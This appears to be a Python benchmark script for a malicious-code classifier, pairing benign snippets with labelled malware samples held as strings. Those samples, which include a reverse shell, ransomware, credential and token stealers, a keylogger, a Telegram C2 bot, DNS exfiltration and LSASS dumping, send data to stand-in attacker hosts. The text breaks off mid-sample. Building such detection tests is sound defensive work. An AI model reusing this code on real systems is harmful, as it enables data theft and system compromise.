"""
ScriptGuard CodeBERT Classifier — Benchmark Script v2
======================================================
Expanded benchmark: 30 benign + 30 plain malicious + 30 obfuscated malicious = 90 total.

New in v2:
  - 10 additional benign samples covering hard FP cases (asyncio, multiprocessing,
    ctypes for GUI, cloud SDKs, ORM, websockets, Celery, gRPC, pytest fixtures,
    Pydantic models)
  - 10 additional plain malicious samples covering archetypes missing from v1
    (mmap injection, Telegram C2, DNS exfil, mmap fileless, WMI persistence,
    living-off-the-land, clipboard crypto hijack, process hollowing stub,
    env variable stealer, LDAP recon)
  - 10 additional obfuscated malicious samples covering gaps in v1
    (__class__.__mro__ gadget chain, exec(open(...).read()), importlib.util
    loader abuse, ctypes shellcode via mmap, memoryview trick, AST node injection,
    bytearray+exec with XOR key, string format % trick, __subclasses__ gadget,
    sys.modules hijack)

Usage:
    python test_benchmark_codebert_v2.py
    python test_benchmark_codebert_v2.py --url http://localhost:8000 --threshold 0.5
    python test_benchmark_codebert_v2.py --verbose
    python test_benchmark_codebert_v2.py --json-out results.json
"""

import argparse
import json
import statistics
import sys
import time
from dataclasses import dataclass
from typing import Optional

try:
    import requests
except ImportError:
    sys.exit("requests library required:  pip install requests")

# ============================================================================
# Test cases
# ============================================================================

@dataclass
class TestCase:
    description: str
    expected: str      # "benign" | "malicious"
    code: str


# --------------------------------------------------------------------------
# 30 benign samples
# --------------------------------------------------------------------------

BENIGN_SAMPLES: list[TestCase] = [
    TestCase(
        description="hello world",
        expected="benign",
        code='print("Hello, World!")\n',
    ),
    TestCase(
        description="fibonacci generator",
        expected="benign",
        code="""
def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        yield a
        a, b = b, a + b

print(list(fibonacci(10)))
""",
    ),
    TestCase(
        description="file read and word count",
        expected="benign",
        code="""
import sys
from pathlib import Path

def word_count(path: str) -> dict:
    counts = {}
    for word in Path(path).read_text().split():
        counts[word] = counts.get(word, 0) + 1
    return counts

if __name__ == "__main__":
    for word, n in sorted(word_count(sys.argv[1]).items()):
        print(f"{word}: {n}")
""",
    ),
    TestCase(
        description="HTTP GET with requests",
        expected="benign",
        code="""
import requests

def fetch_json(url: str) -> dict:
    response = requests.get(url, timeout=10)
    response.raise_for_status()
    return response.json()

data = fetch_json("https://api.github.com/zen")
print(data)
""",
    ),
    TestCase(
        description="pandas data analysis",
        expected="benign",
        code="""
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "name": ["Alice", "Bob", "Charlie"],
    "score": [88, 92, 75],
})

print(df.describe())
print(df[df["score"] > 80]["name"].tolist())
""",
    ),
    TestCase(
        description="Flask web endpoint",
        expected="benign",
        code="""
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok"})

@app.route("/echo", methods=["POST"])
def echo():
    data = request.get_json()
    return jsonify(data)

if __name__ == "__main__":
    app.run(debug=True)
""",
    ),
    TestCase(
        description="argparse + sha256 file hasher",
        expected="benign",
        code="""
import argparse
import hashlib

def compute_hash(path: str, algo: str = "sha256") -> str:
    h = hashlib.new(algo)
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("file")
    parser.add_argument("--algo", default="sha256")
    args = parser.parse_args()
    print(compute_hash(args.file, args.algo))
""",
    ),
    TestCase(
        description="psutil process listing",
        expected="benign",
        code="""
import psutil

for proc in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info"]):
    try:
        info = proc.info
        mem_mb = info["memory_info"].rss / 1024 / 1024
        print(f'{info["pid"]:6}  {info["name"]:<30}  {mem_mb:8.1f} MB')
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        pass
""",
    ),
    TestCase(
        description="paramiko SSH remote exec (devops)",
        expected="benign",
        code="""
import paramiko

def run_remote(host, user, key_path, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, username=user, key_filename=key_path)
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    client.close()
    return output

result = run_remote("192.168.1.10", "deploy", "~/.ssh/id_rsa", "uptime")
print(result)
""",
    ),
    TestCase(
        description="SQLite CRUD",
        expected="benign",
        code="""
import sqlite3

conn = sqlite3.connect(":memory:")
cur = conn.cursor()
cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)")
cur.executemany(
    "INSERT INTO users (name, email) VALUES (?, ?)",
    [("Alice", "alice@example.com"), ("Bob", "bob@example.com")],
)
conn.commit()
for row in cur.execute("SELECT * FROM users"):
    print(row)
conn.close()
""",
    ),
    TestCase(
        description="smtplib send email (notification script)",
        expected="benign",
        code="""
import smtplib
from email.mime.text import MIMEText

def send_notification(to_addr: str, subject: str, body: str) -> None:
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = "alerts@example.com"
    msg["To"] = to_addr
    with smtplib.SMTP("smtp.example.com", 587) as server:
        server.starttls()
        server.login("alerts@example.com", "app_password")
        server.send_message(msg)

send_notification("ops@example.com", "Deploy succeeded", "v2.3.1 is live.")
""",
    ),
    TestCase(
        description="JSON config loader with validation",
        expected="benign",
        code="""
import json
from pathlib import Path
from typing import Any

REQUIRED_KEYS = {"host", "port", "database"}

def load_config(path: str) -> dict[str, Any]:
    cfg = json.loads(Path(path).read_text())
    missing = REQUIRED_KEYS - cfg.keys()
    if missing:
        raise ValueError(f"Config missing required keys: {missing}")
    return cfg

cfg = load_config("config.json")
print(f"Connecting to {cfg['host']}:{cfg['port']}/{cfg['database']}")
""",
    ),
    TestCase(
        description="logging setup boilerplate",
        expected="benign",
        code="""
import logging
import sys

def setup_logging(level: str = "INFO") -> logging.Logger:
    log = logging.getLogger("app")
    log.setLevel(level)
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    log.addHandler(handler)
    return log

logger = setup_logging("DEBUG")
logger.info("Application started")
logger.debug("Debug mode active")
""",
    ),
    TestCase(
        description="pytest unit tests for calculator",
        expected="benign",
        code="""
def add(a, b): return a + b
def sub(a, b): return a - b
def mul(a, b): return a * b
def div(a, b):
    if b == 0:
        raise ZeroDivisionError("Cannot divide by zero")
    return a / b

def test_add():    assert add(2, 3) == 5
def test_sub():    assert sub(5, 3) == 2
def test_mul():    assert mul(4, 5) == 20
def test_div():    assert div(10, 2) == 5.0
def test_div_zero():
    import pytest
    with pytest.raises(ZeroDivisionError):
        div(1, 0)
""",
    ),
    TestCase(
        description="asyncio HTTP scraper",
        expected="benign",
        code="""
import asyncio
import aiohttp

URLS = [
    "https://httpbin.org/get",
    "https://httpbin.org/ip",
    "https://httpbin.org/uuid",
]

async def fetch(session: aiohttp.ClientSession, url: str) -> dict:
    async with session.get(url) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in URLS]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())
""",
    ),
    TestCase(
        description="CSV reader and writer",
        expected="benign",
        code="""
import csv
import io

raw = "name,age,city\\nAlice,30,Warsaw\\nBob,25,Krakow\\nCharlie,35,Gdansk\\n"
reader = csv.DictReader(io.StringIO(raw))
rows = list(reader)

out = io.StringIO()
writer = csv.DictWriter(out, fieldnames=["name", "city"])
writer.writeheader()
for row in rows:
    writer.writerow({"name": row["name"], "city": row["city"]})

print(out.getvalue())
""",
    ),
    TestCase(
        description="dataclass with type annotations",
        expected="benign",
        code="""
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class Product:
    name: str
    price: float
    tags: list[str] = field(default_factory=list)
    discount: Optional[float] = None

    @property
    def final_price(self) -> float:
        if self.discount:
            return self.price * (1 - self.discount)
        return self.price

p = Product("Laptop", 1500.0, tags=["electronics"], discount=0.10)
print(f"{p.name}: {p.final_price:.2f} PLN")
""",
    ),
    TestCase(
        description="Docker SDK container listing",
        expected="benign",
        code="""
import docker

client = docker.from_env()

print("Running containers:")
for container in client.containers.list():
    print(f"  {container.name:<30} {container.status:<12} {container.image.tags}")

print("\\nAll images:")
for image in client.images.list():
    print(f"  {str(image.id)[:19]}  {image.tags}")
""",
    ),
    TestCase(
        description="Click CLI with subcommands",
        expected="benign",
        code="""
import click

@click.group()
def cli():
    pass

@cli.command()
@click.argument("name")
@click.option("--count", default=1, help="Number of greetings")
def greet(name, count):
    for _ in range(count):
        click.echo(f"Hello, {name}!")

@cli.command()
@click.argument("path")
def info(path):
    import os
    stat = os.stat(path)
    click.echo(f"Size: {stat.st_size} bytes")

if __name__ == "__main__":
    cli()
""",
    ),
    TestCase(
        description="matplotlib bar chart to file",
        expected="benign",
        code="""
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

categories = ["Q1", "Q2", "Q3", "Q4"]
values = [120, 145, 98, 167]

fig, ax = plt.subplots()
ax.bar(categories, values, color="steelblue")
ax.set_title("Quarterly Revenue")
ax.set_ylabel("Revenue (k PLN)")
fig.tight_layout()
fig.savefig("revenue.png", dpi=150)
print("Saved revenue.png")
""",
    ),
    # ---------- NEW BENIGN SAMPLES ----------
    TestCase(
        description="asyncio TCP echo server (devops tool)",
        expected="benign",
        code="""
import asyncio

async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    addr = writer.get_extra_info("peername")
    print(f"Connection from {addr}")
    data = await reader.read(1024)
    writer.write(data)
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def main() -> None:
    server = await asyncio.start_server(handle_client, "127.0.0.1", 8888)
    async with server:
        await server.serve_forever()

asyncio.run(main())
""",
    ),
    TestCase(
        description="multiprocessing CPU-bound task pool",
        expected="benign",
        code="""
import multiprocessing
import math

def is_prime(n: int) -> bool:
    if n < 2:
        return False
    for i in range(2, int(math.isqrt(n)) + 1):
        if n % i == 0:
            return False
    return True

if __name__ == "__main__":
    with multiprocessing.Pool(processes=4) as pool:
        candidates = range(1, 10_000)
        primes = [n for n, ok in zip(candidates, pool.map(is_prime, candidates)) if ok]
    print(f"Found {len(primes)} primes below 10000")
""",
    ),
    TestCase(
        description="ctypes calling Windows MessageBox (GUI utility)",
        expected="benign",
        code="""
import ctypes

def show_message(title: str, message: str, style: int = 0) -> int:
    \"\"\"Display a native Windows message box. Returns button ID.\"\"\"
    MB_OK = 0
    return ctypes.windll.user32.MessageBoxW(0, message, title, style | MB_OK)

show_message("ScriptGuard", "Analysis complete — no threats found.")
""",
    ),
    TestCase(
        description="boto3 S3 file sync utility",
        expected="benign",
        code="""
import boto3
import os
from pathlib import Path

def sync_directory_to_s3(local_dir: str, bucket: str, prefix: str = "") -> int:
    s3 = boto3.client("s3")
    uploaded = 0
    for path in Path(local_dir).rglob("*"):
        if path.is_file():
            key = prefix + str(path.relative_to(local_dir)).replace("\\\\", "/")
            s3.upload_file(str(path), bucket, key)
            uploaded += 1
    return uploaded

count = sync_directory_to_s3("./dist", "my-company-releases", "v2.3/")
print(f"Uploaded {count} files to S3")
""",
    ),
    TestCase(
        description="SQLAlchemy ORM model definition",
        expected="benign",
        code="""
from sqlalchemy import Column, Integer, String, DateTime, create_engine
from sqlalchemy.orm import declarative_base, Session
from datetime import datetime

Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id         = Column(Integer, primary_key=True)
    username   = Column(String(64), unique=True, nullable=False)
    email      = Column(String(120), unique=True)
    created_at = Column(DateTime, default=datetime.utcnow)

engine = create_engine("sqlite:///:memory:")
Base.metadata.create_all(engine)

with Session(engine) as session:
    session.add(User(username="alice", email="alice@example.com"))
    session.commit()
    user = session.query(User).filter_by(username="alice").first()
    print(f"Found: {user.username} ({user.email})")
""",
    ),
    TestCase(
        description="websocket client — live price feed",
        expected="benign",
        code="""
import asyncio
import websockets
import json

async def price_feed(uri: str) -> None:
    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({"subscribe": "BTC/USD"}))
        for _ in range(5):
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"BTC/USD = {data.get('price', 'N/A')}")

asyncio.run(price_feed("wss://stream.example.com/v1/prices"))
""",
    ),
    TestCase(
        description="Celery background task definition",
        expected="benign",
        code="""
from celery import Celery
import time

app = Celery("tasks", broker="redis://localhost:6379/0", backend="redis://localhost:6379/1")

@app.task(bind=True, max_retries=3)
def send_report(self, user_id: int, report_type: str) -> dict:
    try:
        time.sleep(0.1)  # simulate work
        return {"status": "sent", "user": user_id, "type": report_type}
    except Exception as exc:
        raise self.retry(exc=exc, countdown=60)

if __name__ == "__main__":
    result = send_report.delay(42, "monthly")
    print(f"Task ID: {result.id}")
""",
    ),
    TestCase(
        description="gRPC client stub usage",
        expected="benign",
        code="""
import grpc
from google.protobuf import empty_pb2

def list_services(channel_address: str) -> None:
    channel = grpc.insecure_channel(channel_address)
    # Reflection-based service listing
    from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
    stub = reflection_pb2_grpc.ServerReflectionStub(channel)
    request = reflection_pb2.ServerReflectionRequest(list_services="")
    responses = stub.ServerReflectionInfo(iter([request]))
    for response in responses:
        for service in response.list_services_response.service:
            print(f"  Service: {service.name}")
    channel.close()

list_services("localhost:50051")
""",
    ),
    TestCase(
        description="pytest fixture with tmp_path and monkeypatch",
        expected="benign",
        code="""
import pytest
import os

@pytest.fixture
def config_file(tmp_path):
    cfg = tmp_path / "config.json"
    cfg.write_text('{"debug": true, "port": 9090}')
    return cfg

def load_config(path):
    import json
    return json.loads(open(path).read())

def test_load_config(config_file):
    cfg = load_config(config_file)
    assert cfg["port"] == 9090
    assert cfg["debug"] is True

def test_env_override(config_file, monkeypatch):
    monkeypatch.setenv("APP_PORT", "8080")
    assert os.environ["APP_PORT"] == "8080"
""",
    ),
    TestCase(
        description="Pydantic v2 model with validators",
        expected="benign",
        code="""
from pydantic import BaseModel, field_validator, EmailStr
from typing import Optional

class UserCreate(BaseModel):
    username: str
    email: str
    age: int
    referral_code: Optional[str] = None

    @field_validator("username")
    @classmethod
    def username_alphanumeric(cls, v: str) -> str:
        if not v.isalnum():
            raise ValueError("username must be alphanumeric")
        return v.lower()

    @field_validator("age")
    @classmethod
    def age_must_be_adult(cls, v: int) -> int:
        if v < 18:
            raise ValueError("must be 18 or older")
        return v

user = UserCreate(username="Alice123", email="alice@example.com", age=25)
print(user.model_dump())
""",
    ),
]


# --------------------------------------------------------------------------
# 30 plain malicious samples
# --------------------------------------------------------------------------

MALICIOUS_SAMPLES: list[TestCase] = [
    TestCase(
        description="reverse shell via socket + dup2",
        expected="malicious",
        code="""
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

reverse_shell("192.168.0.100", 4444)
""",
    ),
    TestCase(
        description="base64-encoded exec payload",
        expected="malicious",
        code="""
import base64
import os

payload = base64.b64decode(
    "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoIHwgYmFzaCcp"
)
exec(compile(payload, "<string>", "exec"))
""",
    ),
    TestCase(
        description="keylogger with pynput + exfil",
        expected="malicious",
        code="""
from pynput import keyboard
import requests

_buf = []

def on_press(key):
    try:
        _buf.append(key.char)
    except AttributeError:
        _buf.append(str(key))
    if len(_buf) >= 50:
        requests.post("http://attacker.example/log", data={"keys": "".join(_buf)})
        _buf.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
""",
    ),
    TestCase(
        description="ransomware file encryption loop",
        expected="malicious",
        code="""
import os
import glob
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY = get_random_bytes(16)

def encrypt_file(path):
    cipher = AES.new(KEY, AES.MODE_EAX)
    with open(path, "rb") as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(path + ".locked", "wb") as f:
        f.write(cipher.nonce + tag + ciphertext)
    os.remove(path)

for ext in ["*.docx", "*.xlsx", "*.pdf", "*.jpg", "*.png"]:
    for path in glob.glob(f"C:/Users/**/{ext}", recursive=True):
        encrypt_file(path)

with open("C:/Users/Public/Desktop/README.txt", "w") as f:
    f.write("Your files have been encrypted. Pay 0.5 BTC to recover them.")
""",
    ),
    TestCase(
        description="browser credential stealer via sqlite",
        expected="malicious",
        code="""
import os
import sqlite3
import shutil
import requests

CHROME_DB = os.path.expanduser(
    r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
)

def steal_credentials():
    tmp = "login_data_copy"
    shutil.copy(CHROME_DB, tmp)
    conn = sqlite3.connect(tmp)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    creds = cur.fetchall()
    conn.close()
    os.remove(tmp)
    requests.post("http://attacker.example/creds", json={"data": str(creds)})

steal_credentials()
""",
    ),
    TestCase(
        description="port scanner with threading",
        expected="malicious",
        code="""
import socket
import threading

OPEN_PORTS = []

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((host, port)) == 0:
        OPEN_PORTS.append(port)
    s.close()

threads = []
for port in range(1, 1025):
    t = threading.Thread(target=scan_port, args=("192.168.1.1", port))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Open ports:", OPEN_PORTS)
""",
    ),
    TestCase(
        description="Windows registry persistence via winreg",
        expected="malicious",
        code="""
import winreg
import os
import shutil

PAYLOAD = os.path.abspath(__file__)
PERSIST_PATH = os.path.join(os.environ["APPDATA"], "svchost.exe")
shutil.copy(PAYLOAD, PERSIST_PATH)

key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,
    winreg.KEY_SET_VALUE,
)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, PERSIST_PATH)
winreg.CloseKey(key)
""",
    ),
    TestCase(
        description="Discord token harvester",
        expected="malicious",
        code="""
import os
import re
import requests

TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
PATHS = {
    "Discord": os.path.join(os.environ.get("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
}

def harvest_tokens():
    tokens = []
    for app, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for f in os.listdir(path):
            if not f.endswith((".log", ".ldb")):
                continue
            content = open(os.path.join(path, f), errors="ignore").read()
            tokens += re.findall(TOKEN_REGEX, content)
    return list(set(tokens))

webhook = "https://discord.com/api/webhooks/FAKE/FAKE"
tokens = harvest_tokens()
for tok in tokens:
    requests.post(webhook, json={"content": f"Token: {tok}"})
""",
    ),
    TestCase(
        description="subprocess shell injection",
        expected="malicious",
        code="""
import subprocess
import sys

user_input = sys.argv[1] if len(sys.argv) > 1 else "id"
result = subprocess.run(
    f"ping -c 1 {user_input}",
    shell=True,
    capture_output=True,
    text=True,
)
print(result.stdout)
""",
    ),
    TestCase(
        description="UAC bypass via fodhelper registry hijack",
        expected="malicious",
        code="""
import winreg
import subprocess

def uac_bypass(cmd):
    key_path = r"Software\\Classes\\ms-settings\\shell\\open\\command"
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.CloseKey(key)
    subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"])
    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)

uac_bypass("C:\\Windows\\System32\\cmd.exe /c whoami > C:\\Users\\Public\\out.txt")
""",
    ),
    TestCase(
        description="WiFi password dumper via netsh",
        expected="malicious",
        code="""
import subprocess
import re
import requests

def dump_wifi_passwords():
    result = subprocess.run(
        ["netsh", "wlan", "show", "profiles"],
        capture_output=True, text=True
    )
    profiles = re.findall(r"All User Profile\s*:\s*(.+)", result.stdout)
    passwords = {}
    for profile in profiles:
        profile = profile.strip()
        detail = subprocess.run(
            ["netsh", "wlan", "show", "profile", profile, "key=clear"],
            capture_output=True, text=True
        )
        match = re.search(r"Key Content\s*:\s*(.+)", detail.stdout)
        if match:
            passwords[profile] = match.group(1).strip()
    return passwords

creds = dump_wifi_passwords()
requests.post("http://attacker.example/wifi", json=creds)
""",
    ),
    TestCase(
        description="clipboard stealer loop",
        expected="malicious",
        code="""
import time
import win32clipboard
import requests

PREV = ""

def steal_clipboard():
    global PREV
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data != PREV and data.strip():
                PREV = data
                requests.post("http://attacker.example/clip", data={"text": data})
        except Exception:
            pass
        time.sleep(1)

steal_clipboard()
""",
    ),
    TestCase(
        description="screenshot capture and exfiltration",
        expected="malicious",
        code="""
import time
import io
import requests
from PIL import ImageGrab

def exfil_screenshots(interval=30):
    while True:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        requests.post(
            "http://attacker.example/screens",
            files={"screenshot": ("screen.png", buf, "image/png")},
        )
        time.sleep(interval)

exfil_screenshots()
""",
    ),
    TestCase(
        description="fileless stager — urllib exec from URL",
        expected="malicious",
        code="""
import urllib.request

url = "http://attacker.example/stage2.py"
with urllib.request.urlopen(url) as resp:
    code = resp.read().decode()

exec(compile(code, url, "exec"), {"__name__": "__main__"})
""",
    ),
    TestCase(
        description="SSH brute force with paramiko",
        expected="malicious",
        code="""
import paramiko

TARGET = "192.168.1.50"
PORT = 22
USER = "root"
WORDLIST = ["password", "123456", "toor", "admin", "root", "qwerty"]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in WORDLIST:
    try:
        client.connect(TARGET, port=PORT, username=USER, password=password, timeout=3)
        print(f"[+] Found: {USER}:{password}")
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Error: {e}")
        break
""",
    ),
    TestCase(
        description="cryptominer dropper via subprocess",
        expected="malicious",
        code="""
import os
import urllib.request
import subprocess
import platform

MINER_URL = "http://attacker.example/xmrig"
POOL = "pool.minexmr.com:4444"
WALLET = "4ABCDEF1234567890ABCDEF"

def drop_and_run():
    dest = os.path.join(os.environ.get("TEMP", "/tmp"), "svchost")
    urllib.request.urlretrieve(MINER_URL, dest)
    os.chmod(dest, 0o755)
    subprocess.Popen(
        [dest, "-o", POOL, "-u", WALLET, "--background", "--donate-level=1"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
    )

drop_and_run()
""",
    ),
    TestCase(
        description="ctypes process injection (WriteProcessMemory)",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

SHELLCODE = bytearray(
    b"\\x90\\x90\\x90\\x90"  # NOP sled placeholder
    b"\\xcc"                 # INT3 breakpoint placeholder
)

kernel32 = ctypes.windll.kernel32

pid = int(input("Target PID: "))
handle = kernel32.OpenProcess(0x1F0FFF, False, pid)
addr = kernel32.VirtualAllocEx(handle, None, len(SHELLCODE), 0x3000, 0x40)
kernel32.WriteProcessMemory(handle, addr, SHELLCODE, len(SHELLCODE), None)
thread = kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
""",
    ),
    TestCase(
        description="scheduled task persistence (schtasks)",
        expected="malicious",
        code="""
import subprocess
import os
import shutil

PAYLOAD_SRC = __file__
PAYLOAD_DST = os.path.join(os.environ.get("APPDATA", ""), "update_helper.py")
shutil.copy(PAYLOAD_SRC, PAYLOAD_DST)

subprocess.run([
    "schtasks", "/create",
    "/tn", "WindowsUpdateHelper",
    "/tr", f"python {PAYLOAD_DST}",
    "/sc", "ONLOGON",
    "/rl", "HIGHEST",
    "/f",
], check=True)
""",
    ),
    TestCase(
        description="ARP spoofing with scapy",
        expected="malicious",
        code="""
import time
import scapy.all as scapy

def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    result = scapy.srp(broadcast / arp, timeout=1, verbose=False)[0]
    return result[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

gateway = "192.168.1.1"
victim   = "192.168.1.50"

while True:
    spoof(victim, gateway)
    spoof(gateway, victim)
    time.sleep(2)
""",
    ),
    TestCase(
        description="LSASS memory dump via ctypes",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

PROCESS_ALL_ACCESS = 0x1F0FFF
MiniDumpWithFullMemory = 0x00000002

dbghelp = ctypes.windll.dbghelp
kernel32 = ctypes.windll.kernel32

lsass_pid = int(input("LSASS PID: "))
handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)

with open("lsass.dmp", "wb") as f:
    dbghelp.MiniDumpWriteDump(
        handle,
        lsass_pid,
        f.fileno(),
        MiniDumpWithFullMemory,
        None, None, None,
    )

kernel32.CloseHandle(handle)
print("Dump saved to lsass.dmp")
""",
    ),
    # ---------- NEW MALICIOUS SAMPLES ----------
    TestCase(
        description="mmap fileless shellcode execution",
        expected="malicious",
        code="""
import mmap
import ctypes
import os

def run_shellcode(shellcode: bytes) -> None:
    mm = mmap.mmap(
        -1, len(shellcode),
        mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
        mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    mm.write(shellcode)
    mm.seek(0)
    buf = (ctypes.c_char * len(shellcode)).from_buffer(mm)
    fn  = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    fn()

SHELLCODE = b"\\x90\\x90\\x90\\xcc"  # NOP + INT3 placeholder
run_shellcode(SHELLCODE)
""",
    ),
    TestCase(
        description="Telegram bot as C2 channel",
        expected="malicious",
        code="""
import os
import subprocess
import requests
import time

BOT_TOKEN  = "1234567890:AAFakeTokenForTestingPurposesOnly"
CHAT_ID    = "-1001234567890"
API_BASE   = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send(text: str) -> None:
    requests.post(f"{API_BASE}/sendMessage", json={"chat_id": CHAT_ID, "text": text})

def get_updates(offset: int = 0):
    r = requests.get(f"{API_BASE}/getUpdates", params={"offset": offset, "timeout": 30})
    return r.json().get("result", [])

def run_command(cmd: str) -> str:
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return out.decode(errors="replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="replace")

send(f"Bot online. Host: {os.uname().nodename}")
offset = 0
while True:
    for update in get_updates(offset):
        offset = update["update_id"] + 1
        text = update.get("message", {}).get("text", "")
        if text.startswith("/exec "):
            result = run_command(text[6:])
            send(result[:4096])
    time.sleep(1)
""",
    ),
    TestCase(
        description="DNS exfiltration via base64-encoded subdomains",
        expected="malicious",
        code="""
import os
import socket
import base64
import time

C2_DOMAIN = "exfil.attacker.example"

def exfil_via_dns(data: bytes, domain: str = C2_DOMAIN) -> None:
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    for chunk in chunks:
        label = base64.b32encode(chunk).decode().rstrip("=").lower()
        query = f"{label}.{domain}"
        try:
            socket.gethostbyname(query)
        except socket.gaierror:
            pass
        time.sleep(0.1)

hostname   = os.uname().nodename.encode()
username   = os.environ.get("USER", "unknown").encode()
secret_dir = os.listdir(os.path.expanduser("~"))
payload    = hostname + b"|" + username + b"|" + str(secret_dir).encode()
exfil_via_dns(payload)
""",
    ),
    TestCase(
        description="environment variable and secrets harvester",
        expected="malicious",
        code="""
import os
import re
import requests

SECRET_PATTERNS = [
    r"(?i)(password|passwd|secret|token|api[_-]?key|aws[_-]?secret|private[_-]?key)",
    r"(?i)(database[_-]?url|connection[_-]?string)",
    r"AKIA[0-9A-Z]{16}",          # AWS access key
    r"ghp_[0-9a-zA-Z]{36}",       # GitHub token
]

def harvest_env() -> dict:
    found = {}
    for key, value in os.environ.items():
        for pattern in SECRET_PATTERNS:
            if re.search(pattern, key) or re.search(pattern, value):
                found[key] = value
                break
    return found

secrets = harvest_env()
if secrets:
    requests.post(
        "http://attacker.example/secrets",
        json=secrets,
        timeout=5,
    )
""",
    ),
    TestCase(
        description="WMI persistence via win32com",
        expected="malicious",
        code="""
import win32com.client
import os

PAYLOAD_PATH = os.path.abspath(__file__)

def persist_via_wmi(payload: str) -> None:
    wmi = win32com.client.GetObject("winmgmts:")
    subscription_class = wmi.Get("__EventFilter")
    filter_instance = subscription_class.SpawnInstance_()
    filter_instance.Name = "WindowsHealthMonitor"
    filter_instance.QueryLanguage = "WQL"
    filter_instance.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"
    filter_instance.Put_()

    consumer_class = wmi.Get("CommandLineEventConsumer")
    consumer_instance = consumer_class.SpawnInstance_()
    consumer_instance.Name = "WindowsHealthMonitorConsumer"
    consumer_instance.CommandLineTemplate = f"python {payload}"
    consumer_instance.Put_()

persist_via_wmi(PAYLOAD_PATH)
print(f"WMI persistence set for {PAYLOAD_PATH}")
""",
    ),
    TestCase(
        description="living-off-the-land via certutil + bitsadmin",
        expected="malicious",
        code="""
import subprocess
import os
import tempfile

PAYLOAD_URL  = "http://attacker.example/payload.exe"
STAGE_PATH   = os.path.join(tempfile.gettempdir(), "msupdate.exe")

def download_with_certutil(url: str, dest: str) -> bool:
